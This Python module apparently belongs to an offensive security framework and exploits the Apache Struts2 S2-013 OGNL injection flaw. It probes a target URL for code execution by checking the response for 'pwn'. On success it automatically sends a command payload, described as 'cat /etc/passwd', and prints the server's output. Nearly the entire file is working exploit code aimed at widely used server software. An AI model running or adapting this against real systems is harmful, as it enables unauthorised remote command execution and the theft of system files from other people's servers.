from blessings import Terminal
t = Terminal()

from urllib import parse
from bs4 import BeautifulSoup as Soup

from framework.utils.logger import logger
from framework.modules.struts2.struts2_enums import Struts2Enum

import sys
import requests


class Struts2IncludeParamsAction(object):

    """ Struts2 module for S2-013 http://struts.apache.org/docs/s2-013.html
    """

    def __init__(self, url):

        self.url = url

    def fatality_exec(self):

        """ Fatality Execution ('cat /etc/passwd')
        """

        try:
            logger("info", "Attempting Execution :: {0}".format(t.yellow(Struts2Enum.fatality.value)))
            r = requests.get(''.join("{0}{1}{2}".format(self.url, Struts2Enum.param.value,
                                                        parse.quote_plus(Struts2Enum.fatality.value))))
            if r.status_code == 200:
                logger("info", "Execution Success!")
                logger("info", ''.join(t.yellow(r.text)))
            else:
                logger("warning", "Unexpected Status Code!")
        except requests.HTTPError:
            logger("warning", "HTTP Error")
            sys.exit(1)
        except requests.ConnectionError:
            logger("warning", "HTTP Error")
            sys.exit(1)

    def check_exec(self):

        """ Check Execution
        """

        payload, param = parse.quote_plus(Struts2Enum.check.value), Struts2Enum.param.value
        target = ''.join("{0}{1}{2}".format(self.url, param, payload))

        try:
            logger("info", "Checking Target :: {0}".format(t.yellow(self.url)))
            r = requests.get(target)
            if r.status_code != 200:
                logger("warning", "Unexpected Status Code!")
            else:
                if r.text:
                    html = Soup(r.text)
                    response = html.find('slither').contents[0]
                    if response == "pwn":
                        logger("info", "Code Execution Possible! :: {0}".format(t.yellow(response)))
                        self.fatality_exec()
                    else:
                        logger("warning", "Code Execution Not Possible!")
                else:
                    logger("warning", "No HTTP Response!")
        except requests.HTTPError:
            logger("warning", "HTTP Error")
            sys.exit(1)
        except requests.ConnectionError:
            logger("warning", "Connection Error!")
            sys.exit(1)